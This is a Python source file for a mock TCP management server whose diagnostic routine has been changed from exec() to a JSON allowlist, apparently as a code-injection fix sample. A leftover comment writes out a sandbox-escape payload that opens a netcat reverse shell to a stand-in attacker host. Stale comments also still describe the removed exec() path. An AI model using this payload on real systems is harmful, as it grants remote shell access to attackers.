import os
import json
import time
import logging
import threading
import socketserver
from datetime import datetime

# Configure logging for the Legacy TCP Management Console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SysManagementTCP - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TCPConsole")

# Mock System State Database
SYSTEM_STATE = {
    "cpu_usage": 45.2,
    "memory_usage": 1024 * 8,
    "disk_space": 1024 * 500,
    "active_users": ["admin", "sysop", "guest"],
    "uptime_seconds": 360000,
    "services": {
        "apache": "running",
        "mysql": "running",
        "postfix": "stopped"
    }
}

class SystemMetricsHistory:
    """Stores historical metrics for diagnostics."""
    def __init__(self):
        self.history = []
        self.lock = threading.Lock()

    def record_metrics(self):
        with self.lock:
            self.history.append({
                "timestamp": datetime.now().isoformat(),
                "cpu": SYSTEM_STATE["cpu_usage"],
                "mem": SYSTEM_STATE["memory_usage"]
            })
            if len(self.history) > 100:
                self.history.pop(0)

    def get_history(self):
        with self.lock:
            return list(self.history)

metrics_db = SystemMetricsHistory()

def run_background_monitor():
    """Simulates a background thread recording system metrics periodically."""
    while True:
        metrics_db.record_metrics()
        time.sleep(60)

def execute_diagnostic_routine(diagnostic_config_json: str) -> dict:
    """
    SECURE: Prevents Code Injection (CWE-94) by replacing arbitrary code 
    execution (exec) with a structured, JSON-based declarative command interface.
    """
    import json
    
    logger.info("Executing secure diagnostic routine from remote client.")
    
    try:
        # Secure: We remove the dangerous exec() function entirely.
        # Executing untrusted strings as Python code over a TCP socket is a 
        # critical vulnerability. Instead, we implement a structured approach 
        # where the client submits a JSON object defining the diagnostic task.
        # Note: The client must be updated to send JSON configuration 
        # (e.g., {"task": "history_summary"}) rather than raw Python scripts.
        
        config = json.loads(diagnostic_config_json)
        
        if not isinstance(config, dict):
            logger.warning("Diagnostic configuration must be a valid JSON object.")
            return {"status": "error", "message": "Invalid configuration format."}
            
        task = config.get("task")
        report = {}
        
        # Explicit allowlist of supported safe diagnostic operations
        if task == "current_state":
            report["cpu"] = SYSTEM_STATE.get("cpu_usage")
            report["memory"] = SYSTEM_STATE.get("memory_usage")
            report["disk"] = SYSTEM_STATE.get("disk_space")
            report["uptime"] = SYSTEM_STATE.get("uptime_seconds")
            
        elif task == "history_summary":
            history = metrics_db.get_history()
            if history:
                avg_cpu = sum(entry.get("cpu", 0) for entry in history) / len(history)
                avg_mem = sum(entry.get("mem", 0) for entry in history) / len(history)
                report["average_cpu"] = round(avg_cpu, 2)
                report["average_memory"] = round(avg_mem, 2)
                report["data_points"] = len(history)
            else:
                report["message"] = "No historical data available."
                
        elif task == "service_status":
            target_service = config.get("service")
            services = SYSTEM_STATE.get("services", {})
            if target_service and target_service in services:
                report[target_service] = services[target_service]
            else:
                report["all_services"] = services
                
        else:
            logger.warning(f"Ignored unknown or unauthorized diagnostic task: '{task}'")
            return {"status": "error", "message": f"Unknown diagnostic task: {task}"}
            
        logger.info("Secure diagnostic routine completed successfully.")
        return {"status": "success", "data": report}
        
    except json.JSONDecodeError as e:
        logger.error(f"Failed to parse diagnostic configuration as JSON: {e}")
        return {"status": "error", "message": "Invalid JSON configuration format."}
    except Exception as e:
        logger.error(f"Unexpected error executing secure diagnostic: {e}")
        return {"status": "error", "message": "Internal Execution Error"}

class ManagementTCPHandler(socketserver.BaseRequestHandler):
    """
    The request handler class for our TCP server.
    It is instantiated once per connection to the server.
    """
    def handle(self):
        client_ip = self.client_address[0]
        logger.info(f"Incoming connection accepted from {client_ip}")
        
        try:
            self.request.sendall(b"Welcome to the Legacy System Management Console.\n")
            self.request.sendall(b"Awaiting JSON commands...\n")
            
            data = self.request.recv(4096).strip()
            if not data:
                return
                
            payload_str = data.decode('utf-8')
            logger.debug(f"Received payload from {client_ip}: {payload_str}")
            
            try:
                command = json.loads(payload_str)
            except json.JSONDecodeError:
                self.request.sendall(b'{"status": "error", "message": "Invalid JSON payload"}\n')
                return

            action = command.get("action")
            
            if action == "ping":
                self.request.sendall(b'{"status": "success", "message": "pong"}\n')
                
            elif action == "get_state":
                response = json.dumps({"status": "success", "data": SYSTEM_STATE}) + "\n"
                self.request.sendall(response.encode('utf-8'))
                
            elif action == "run_diagnostic":
                script = command.get("script")
                if not script:
                    self.request.sendall(b'{"status": "error", "message": "Missing script parameter"}\n')
                    return
                    
                # Pass the untrusted string directly to the vulnerable function
                result = execute_diagnostic_routine(script)
                
                response = json.dumps(result) + "\n"
                self.request.sendall(response.encode('utf-8'))
                
            else:
                self.request.sendall(b'{"status": "error", "message": "Unknown action"}\n')
                
        except ConnectionResetError:
            logger.warning(f"Connection dropped by {client_ip}")
        except Exception as e:
            logger.error(f"Error handling request from {client_ip}: {e}")
            
        finally:
            logger.info(f"Connection closed for {client_ip}")

if __name__ == "__main__":
    monitor_thread = threading.Thread(target=run_background_monitor, daemon=True)
    monitor_thread.start()
    
    HOST, PORT = "0.0.0.0", 8888
    
    # Example Malicious Trigger:
    # 1. Attacker connects to the exposed management port using netcat or telnet:
    #    nc 127.0.0.1 8888
    # 2. Attacker sends a crafted JSON payload containing a malicious script:
    #    {"action": "run_diagnostic", "script": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"}
    # 3. The socket handler decodes the JSON and passes the string to exec(), granting RCE.
    
    logger.info(f"Starting Legacy TCP Management Server on {HOST}:{PORT}")
    try:
        with socketserver.ThreadingTCPServer((HOST, PORT), ManagementTCPHandler) as server:
            server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down management server...")
